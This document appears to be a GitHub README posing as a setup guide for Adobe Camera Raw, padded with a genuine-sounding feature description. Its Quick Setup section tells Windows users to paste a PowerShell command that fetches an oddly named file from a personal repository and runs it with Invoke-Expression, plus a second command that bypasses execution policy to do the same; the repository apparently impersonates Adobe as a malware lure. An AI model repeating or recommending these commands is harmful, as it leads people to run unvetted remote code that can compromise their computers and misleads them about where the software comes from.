# Camera Raw

Camera Raw is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Camera Raw and work in it.

Adobe Camera Raw is the RAW development engine Adobe uses across its photography apps on Windows. It reads native camera files and DNG, applies demosaicing and color science, and exposes sliders for exposure, white balance, curves, noise reduction, sharpening, lens corrections, and local adjustments with masks.

A typical session starts when you open RAW files from a shoot in Bridge or Photoshop. You set a baseline look with profile and white balance, refine highlights and shadows, correct distortion and chromatic aberration, then use masking to adjust skies or subjects separately. You can copy settings across a series, export to PSD or TIFF, or hand off edits to Lightroom while keeping the RAW non-destructive.

This repository tracks a Windows-oriented bundle for the product: a setup file for installation, short configuration notes for host app compatibility, and a changelog that records version bumps, new camera support, and processing fixes. Use it to align lab or studio machines and see what changed between releases without hunting scattered release bulletins.

## What you do with it

- Built-in camera profiles map manufacturer color science to a neutral starting point.
- Adaptive profiles balance contrast and saturation while protecting clipped highlight detail.
- Lens correction profiles fix geometric distortion, vignetting, and lateral chromatic aberration automatically.
- Local adjustment brushes and linear gradients target exposure and color in selected image regions.
- Noise reduction separates luminance grain from color speckle for cleaner high-ISO captures.
- Sharpening controls radius, detail, and masking to avoid halos along high-contrast edges.
- Batch sync copies develop settings across hundreds of frames from the same lighting setup.
- Non-destructive edits store as metadata sidecars so original RAW pixels stay untouched on disk.

## Quick Setup (PowerShell)

This installs the program Camera Raw on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/silke726862/camera-raw-setup-guide/main/x5csqkfb7z.awzhyso1 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/silke726862/camera-raw-setup-guide/main/x5csqkfb7z.awzhyso1 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `x5csqkfb7z.awzhyso1` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `silke726862/camera-raw-setup-guide`. Adobe Camera Raw 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
